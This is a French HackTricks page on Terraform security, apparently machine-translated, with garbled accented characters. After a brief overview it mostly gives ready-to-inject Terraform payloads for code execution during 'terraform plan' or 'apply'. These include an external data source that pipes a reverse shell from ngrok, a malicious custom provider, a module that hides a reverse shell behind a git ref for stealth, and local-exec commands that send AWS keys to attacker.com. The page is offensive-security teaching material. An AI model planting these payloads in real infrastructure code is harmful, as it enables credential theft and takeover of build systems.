# S√©curit√© Terraform

<details>

<summary><strong>Apprenez le hacking AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Informations de base

[D'apr√®s la documentation :](https://developer.hashicorp.com/terraform/intro)

HashiCorp Terraform est un outil **d'infrastructure en tant que code** qui vous permet de d√©finir √† la fois des ressources **cloud et sur site** dans des fichiers de configuration lisibles par l'homme que vous pouvez versionner, r√©utiliser et partager. Vous pouvez ensuite utiliser un workflow coh√©rent pour provisionner et g√©rer toute votre infrastructure tout au long de son cycle de vie. Terraform peut g√©rer des composants de bas niveau comme le calcul, le stockage et les ressources r√©seau, ainsi que des composants de haut niveau comme les entr√©es DNS et les fonctionnalit√©s SaaS.

### Comment fonctionne Terraform ?

Terraform cr√©e et g√®re des ressources sur des plateformes cloud et d'autres services via leurs interfaces de programmation d'applications (API). Les fournisseurs permettent √† Terraform de fonctionner avec pratiquement n'importe quelle plateforme ou service disposant d'une API accessible.

![](<../.gitbook/assets/image (33).png>)

HashiCorp et la communaut√© Terraform ont d√©j√† √©crit **plus de 1700 fournisseurs** pour g√©rer des milliers de types de ressources et de services diff√©rents, et ce nombre continue de cro√Ætre. Vous pouvez trouver tous les fournisseurs disponibles publiquement sur le [Registre Terraform](https://registry.terraform.io/), y compris Amazon Web Services (AWS), Azure, Google Cloud Platform (GCP), Kubernetes, Helm, GitHub, Splunk, DataDog, et bien d'autres.

Le workflow principal de Terraform se compose de trois √©tapes :

* **√âcrire :** Vous d√©finissez des ressources, qui peuvent √™tre r√©parties sur plusieurs fournisseurs de cloud et services. Par exemple, vous pourriez cr√©er une configuration pour d√©ployer une application sur des machines virtuelles dans un r√©seau Virtual Private Cloud (VPC) avec des groupes de s√©curit√© et un √©quilibreur de charge.
* **Planifier :** Terraform cr√©e un plan d'ex√©cution d√©crivant l'infrastructure qu'il va cr√©er, mettre √† jour ou d√©truire en fonction de l'infrastructure existante et de votre configuration.
* **Appliquer :** Avec approbation, Terraform effectue les op√©rations propos√©es dans l'ordre correct, en respectant les d√©pendances entre les ressources. Par exemple, si vous mettez √† jour les propri√©t√©s d'un VPC et changez le nombre de machines virtuelles dans ce VPC, Terraform recr√©era le VPC avant de redimensionner les machines virtuelles.

![](<../.gitbook/assets/image (81).png>)

## Labo Terraform

Installez simplement terraform sur votre ordinateur.

Voici un [guide](https://learn.hashicorp.com/tutorials/terraform/install-cli) et ici la [meilleure fa√ßon de t√©l√©charger terraform](https://www.terraform.io/downloads).

## RCE dans Terraform

Terraform **n'a pas de plateforme exposant une page web ou un service r√©seau** que nous pouvons √©num√©rer, donc, la seule fa√ßon de compromettre terraform est de **pouvoir ajouter/modifier des fichiers de configuration terraform**.

Cependant, terraform est un composant **tr√®s sensible** √† compromettre car il aura un **acc√®s privil√©gi√©** √† diff√©rents emplacements pour pouvoir fonctionner correctement.

La principale fa√ßon pour un attaquant de pouvoir compromettre le syst√®me o√π terraform est ex√©cut√© est de **compromettre le d√©p√¥t qui stocke les configurations terraform**, car √† un moment donn√©, elles vont √™tre **interpr√©t√©es**.

En fait, il existe des solutions qui **ex√©cutent automatiquement terraform plan/apply apr√®s la cr√©ation d'une PR**, telles que **Atlantis** :

{% content-ref url="atlantis-security.md" %}
[atlantis-security.md](atlantis-security.md)
{% endcontent-ref %}

Si vous parvenez √† compromettre un fichier terraform, il existe diff√©rentes mani√®res d'effectuer un RCE lorsque quelqu'un ex√©cute `terraform plan` ou `terraform apply`.

### Terraform plan

Terraform plan est la **commande la plus utilis√©e** dans terraform et les d√©veloppeurs/solutions utilisant terraform l'appellent tout le temps, donc le **moyen le plus simple d'obtenir un RCE** est de s'assurer que vous empoisonnez un fichier de configuration terraform qui ex√©cutera des commandes arbitraires lors d'un `terraform plan`.

#### Utilisation d'un fournisseur externe

Terraform propose le [`external` provider](https://registry.terraform.io/providers/hashicorp/external/latest/docs) qui offre un moyen d'interfacer Terraform avec des programmes externes. Vous pouvez utiliser la source de donn√©es `external` pour ex√©cuter du code arbitraire pendant un `plan`.

Injecter dans un fichier de configuration terraform quelque chose comme ce qui suit ex√©cutera un shell invers√© lors de l'ex√©cution de `terraform plan` :
```javascript
data "external" "example" {
program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```
#### Utilisation d'un fournisseur personnalis√©

Un attaquant pourrait envoyer un [fournisseur personnalis√©](https://learn.hashicorp.com/tutorials/terraform/provider-setup) au [Terraform Registry](https://registry.terraform.io/) et ensuite l'ajouter au code Terraform dans une branche de fonctionnalit√© ([exemple ici](https://alex.kaskaso.li/post/terraform-plan-rce)):
```javascript
terraform {
required_providers {
evil = {
source  = "evil/evil"
version = "1.0"
}
}
}

provider "evil" {}
```
Le fournisseur est t√©l√©charg√© lors de l'`init` et ex√©cutera le code malveillant lorsque `plan` est ex√©cut√©

Vous pouvez trouver un exemple sur [https://github.com/rung/terraform-provider-cmdexec](https://github.com/rung/terraform-provider-cmdexec)

#### Utilisation d'une r√©f√©rence externe

Les deux options mentionn√©es sont utiles mais pas tr√®s discr√®tes (la seconde est plus discr√®te mais plus complexe que la premi√®re). Vous pouvez r√©aliser cette attaque de mani√®re encore plus **discr√®te**, en suivant ces suggestions :

* Au lieu d'ajouter le rev shell directement dans le fichier terraform, vous pouvez **charger une ressource externe** qui contient le rev shell :
```javascript
module "not_rev_shell" {
source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```
Vous pouvez trouver le code de la coquille invers√©e sur [https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules](https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules)

* Dans la ressource externe, utilisez la fonctionnalit√© **ref** pour masquer **le code de la coquille invers√©e terraform dans une branche** √† l'int√©rieur du d√©p√¥t, quelque chose comme : `git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`

### Terraform Apply

Terraform apply sera ex√©cut√© pour appliquer tous les changements, vous pouvez √©galement en abuser pour obtenir un RCE en injectant **un fichier Terraform malveillant avec** [**local-exec**](https://www.terraform.io/docs/provisioners/local-exec.html)**.**\
Vous devez juste vous assurer qu'un payload comme les suivants se retrouve dans le fichier `main.tf` :
```json
// Payload 1 to just steal a secret
resource "null_resource" "secret_stealer" {
provisioner "local-exec" {
command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
}
}

// Payload 2 to get a rev shell
resource "null_resource" "rev_shell" {
provisioner "local-exec" {
command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
}
}
```
Suivez les **suggestions de la technique pr√©c√©dente** pour r√©aliser cette attaque de mani√®re **plus discr√®te en utilisant des r√©f√©rences externes**.

## Secrets Dumps

Vous pouvez obtenir **les valeurs secr√®tes utilis√©es par terraform** en ex√©cutant `terraform apply` en ajoutant au fichier terraform quelque chose comme :
```json
output "dotoken" {
value = nonsensitive(var.do_token)
}
```
## Outils d'Audit

* [**tfsec**](https://github.com/aquasecurity/tfsec) : tfsec utilise l'analyse statique de votre code terraform pour d√©tecter d'√©ventuelles mauvaises configurations.
* [**terascan**](https://github.com/tenable/terrascan) : Terrascan est un analyseur de code statique pour l'Infrastructure as Code.

## R√©f√©rences

* [S√©curit√© Atlantis](atlantis-security.md)
* [https://alex.kaskaso.li/post/terraform-plan-rce](https://alex.kaskaso.li/post/terraform-plan-rce)
* [https://developer.hashicorp.com/terraform/intro](https://developer.hashicorp.com/terraform/intro)


<details>

<summary><strong>Apprenez le hacking AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
